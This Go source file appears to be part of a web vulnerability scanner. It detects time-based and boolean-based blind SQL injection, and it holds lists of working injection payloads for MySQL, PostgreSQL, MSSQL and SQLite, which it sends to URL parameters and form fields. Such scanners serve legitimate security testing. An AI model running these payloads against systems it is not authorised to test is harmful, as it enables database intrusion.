package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"time"
)

// (type moved to pkg/core)

// detectSQLiVsBaseline only flags errors NOT present in the baseline response

// ScanBlindSQLiTime tests time-based blind SQL injection
func ScanBlindSQLiTime(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	type tpl struct {
		payload string
		sleep   int
		db      string
	}
	payloads := []tpl{
		{"' AND SLEEP(4)--", 4, "MySQL"},
		{"1 AND SLEEP(4)", 4, "MySQL"},
		{"\" AND SLEEP(4)--", 4, "MySQL"},
		{"' OR SLEEP(4)--", 4, "MySQL"},
		{"'; SELECT pg_sleep(4)--", 4, "PostgreSQL"},
		{"' AND 1=(SELECT 1 FROM PG_SLEEP(4))--", 4, "PostgreSQL"},
		{"'; WAITFOR DELAY '0:0:4'--", 4, "MSSQL"},
		{"1; WAITFOR DELAY '0:0:4'--", 4, "MSSQL"},
		{"' AND RANDOMBLOB(800000000/1)--", 3, "SQLite"},
		{"1' AND (SELECT * FROM (SELECT(SLEEP(4)))x)--", 4, "MySQL"},
	}

	// URL params
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}
	for param := range params {
		// Statistical baseline: 3 samples to measure normal response time
		var baselineSamples []time.Duration
		for i := 0; i < 3; i++ {
			t0 := time.Now()
			core.DoGET(client, cfg, target.URL) //nolint:errcheck
			baselineSamples = append(baselineSamples, time.Since(t0))
		}
		baseAvg := avgDuration(baselineSamples)

	BlindTimeLoop:
		for _, tp := range payloads {
			testURL, _ := core.SetParam(target.URL, param, tp.payload)

			// Injected sample: 2 requests with payload for averaging
			var injSamples []time.Duration
			for i := 0; i < 2; i++ {
				t1 := time.Now()
				_, _, err := core.DoGET(client, cfg, testURL)
				injSamples = append(injSamples, time.Since(t1))
				if err != nil {
					continue
				}
			}
			if len(injSamples) == 0 {
				continue
			}
			injAvg := avgDuration(injSamples)

			// Match if injected time >= baseline + expected sleep
			threshold := baseAvg + time.Duration(tp.sleep)*time.Second
			if injAvg >= threshold {
				results = append(results, core.ScanResult{
					Type: fmt.Sprintf("SQL Injection Time-Based Blind [%s]", tp.db),
					URL:  testURL, Method: "GET", Parameter: param,
					Payload: tp.payload, Severity: "HIGH",
					Evidence:  fmt.Sprintf("injected avg %v vs baseline avg %v (threshold %v)", injAvg.Round(time.Millisecond), baseAvg.Round(time.Millisecond), threshold.Round(time.Millisecond)),
					Timestamp: time.Now(),
				})
				fmt.Printf("  [BLIND-SQLI] param=%s delay=%v\n", param, injAvg.Round(time.Millisecond))
				break BlindTimeLoop
			}
		}
	}

	// Forms
	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
			var baseTime time.Duration

		BlindTimeFormLoop:
			for _, tp := range payloads {
				// Refresh baseline before each payload to avoid stale-timing false negatives
				t0 := time.Now()
				if form.Method == "POST" {
					core.DoPOST(client, cfg, form.Action, core.FormDefaults(form)) //nolint:errcheck
				} else {
					core.DoGET(client, cfg, form.Action) //nolint:errcheck
				}
				baseTime = time.Since(t0)

				d := core.FormDefaults(form)
				d.Set(inp.Name, tp.payload)
				t1 := time.Now()
				var status int
				var err error
				if form.Method == "POST" {
					_, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, tp.payload)
					u, _ := core.SetFormParams(form.Action, d)
					_, status, err = core.DoGET(client, cfg, u)
				}
				elapsed := time.Since(t1)
				if err != nil {
					continue
				}
				threshold := baseTime + time.Duration(tp.sleep-1)*time.Second
				if elapsed >= threshold {
					results = append(results, core.ScanResult{
						Type: fmt.Sprintf("SQL Injection Time-Based Blind via core.Form [%s]", tp.db),
						URL:  form.Action, Method: form.Method, Parameter: inp.Name,
						Payload: tp.payload, Severity: "HIGH",
						Evidence:  fmt.Sprintf("delay %v (baseline %v) HTTP=%d", elapsed.Round(time.Millisecond), baseTime.Round(time.Millisecond), status),
						Timestamp: time.Now(),
					})
					fmt.Printf("  [BLIND-SQLI-FORM] %s input=%s delay=%v\n", form.Action, inp.Name, elapsed.Round(time.Millisecond))
					break BlindTimeFormLoop
				}
			}
		}
	}

	return results
}

// ScanBooleanBlindSQLi tests boolean-based blind injection by comparing true/false responses
func ScanBooleanBlindSQLi(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	type pair struct {
		trueP  string
		falseP string
	}
	pairs := []pair{
		{"' OR 1=1--", "' OR 1=2--"},
		{"' AND 1=1--", "' AND 1=2--"},
		{"1 AND 1=1", "1 AND 1=2"},
		{"' OR 'a'='a", "' OR 'a'='b"},
		{"1' AND '1'='1", "1' AND '1'='2"},
	}

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		for _, pr := range pairs {
			urlTrue, _ := core.SetParam(target.URL, param, pr.trueP)
			urlFalse, _ := core.SetParam(target.URL, param, pr.falseP)

			bodyTrue, statusTrue, err := core.DoGET(client, cfg, urlTrue)
			if err != nil {
				continue
			}
			bodyFalse, statusFalse, err := core.DoGET(client, cfg, urlFalse)
			if err != nil {
				continue
			}

			// Significant difference in response = likely boolean blind
			lenDiff := len(bodyTrue) - len(bodyFalse)
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}
			statusDiff := statusTrue != statusFalse

			if lenDiff > 100 || statusDiff {
				results = append(results, core.ScanResult{
					Type: "SQL Injection Boolean-Based Blind",
					URL:  urlTrue, Method: "GET", Parameter: param,
					Payload:   fmt.Sprintf("TRUE: %s | FALSE: %s", pr.trueP, pr.falseP),
					Severity:  "HIGH",
					Evidence:  fmt.Sprintf("response diff: %d bytes (status %d vs %d)", lenDiff, statusTrue, statusFalse),
					Timestamp: time.Now(),
				})
				fmt.Printf("  [BOOL-SQLI] param=%s diff=%d bytes\n", param, lenDiff)
				break
			}
		}
	}

	// Forms (GET + POST) — mirrors the URL-param logic above
	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
		BoolFormLoop:
			for _, pr := range pairs {
				dTrue := core.FormDefaults(form)
				dTrue.Set(inp.Name, pr.trueP)
				dFalse := core.FormDefaults(form)
				dFalse.Set(inp.Name, pr.falseP)

				var bodyTrue, bodyFalse string
				var statusTrue, statusFalse int
				var err error

				if form.Method == "POST" {
					bodyTrue, statusTrue, err = core.DoPOST(client, cfg, form.Action, dTrue)
					if err != nil {
						continue
					}
					bodyFalse, statusFalse, err = core.DoPOST(client, cfg, form.Action, dFalse)
					if err != nil {
						continue
					}
				} else {
					dTrue := core.FormDefaults(form)
					dTrue.Set(inp.Name, pr.trueP)
					uTrue, _ := core.SetFormParams(form.Action, dTrue)
					dFalse := core.FormDefaults(form)
					dFalse.Set(inp.Name, pr.falseP)
					uFalse, _ := core.SetFormParams(form.Action, dFalse)
					bodyTrue, statusTrue, err = core.DoGET(client, cfg, uTrue)
					if err != nil {
						continue
					}
					bodyFalse, statusFalse, err = core.DoGET(client, cfg, uFalse)
					if err != nil {
						continue
					}
				}

				lenDiff := len(bodyTrue) - len(bodyFalse)
				if lenDiff < 0 {
					lenDiff = -lenDiff
				}
				statusDiff := statusTrue != statusFalse

				if lenDiff > 100 || statusDiff {
					results = append(results, core.ScanResult{
						Type: "SQL Injection Boolean-Based Blind via core.Form",
						URL:  form.Action, Method: form.Method, Parameter: inp.Name,
						Payload:   fmt.Sprintf("TRUE: %s | FALSE: %s", pr.trueP, pr.falseP),
						Severity:  "HIGH",
						Evidence:  fmt.Sprintf("response diff: %d bytes (status %d vs %d)", lenDiff, statusTrue, statusFalse),
						Timestamp: time.Now(),
					})
					fmt.Printf("  [BOOL-SQLI-FORM] %s input=%s diff=%d bytes\n", form.Action, inp.Name, lenDiff)
					break BoolFormLoop
				}
			}
		}
	}

	return results
}

// avgDuration returns the arithmetic mean of a slice of durations.
func avgDuration(samples []time.Duration) time.Duration {
	if len(samples) == 0 {
		return 0
	}
	var sum time.Duration
	for _, s := range samples {
		sum += s
	}
	return sum / time.Duration(len(samples))
}
